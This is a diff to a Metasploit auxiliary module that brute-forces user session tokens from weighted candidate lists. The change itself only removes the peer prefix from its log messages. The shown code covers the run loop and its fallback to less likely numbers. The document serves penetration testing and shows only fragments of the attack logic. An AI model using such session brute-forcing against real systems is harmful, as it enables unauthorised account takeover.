@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
       total *= len.to_i
     end
 
-    print_status("#{peer} - Generating " + total.to_s + " session tokens")
+    print_status("Generating " + total.to_s + " session tokens")
     final_list = Array.new
 
     # code below taken from https://gist.github.com/Yengas/9010715
@@ -131,20 +131,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @counter = 0
-    print_status("#{peer} - Bruteforcing session - this might take a while, go get some coffee!")
+    print_status("Bruteforcing session - this might take a while, go get some coffee!")
     session = nil
     time = Benchmark.realtime {
       session = session_bruteforce_list(WEIGHTED_ARRAY_7)
       if session == nil
-        print_error("#{peer} - Failed to bruteforce, trying with the less likely numbers as a last resort...")
+        print_error("Failed to bruteforce, trying with the less likely numbers as a last resort...")
         session = session_bruteforce_list(WEIGHTED_ARRAY_6)
       end
     }
     if session == nil
       fail_with(Failure::Unknown, "Failed to bruteforce user session.")
     else
-      print_good("#{peer} - Found valid user session: #{session.to_s}")
-      print_status("#{peer} - Time taken: #{time.to_s} seconds; total tries #{@counter.to_s}")
+      print_good("Found valid user session: #{session.to_s}")
+      print_status("Time taken: #{time.to_s} seconds; total tries #{@counter.to_s}")
     end
   end
 end
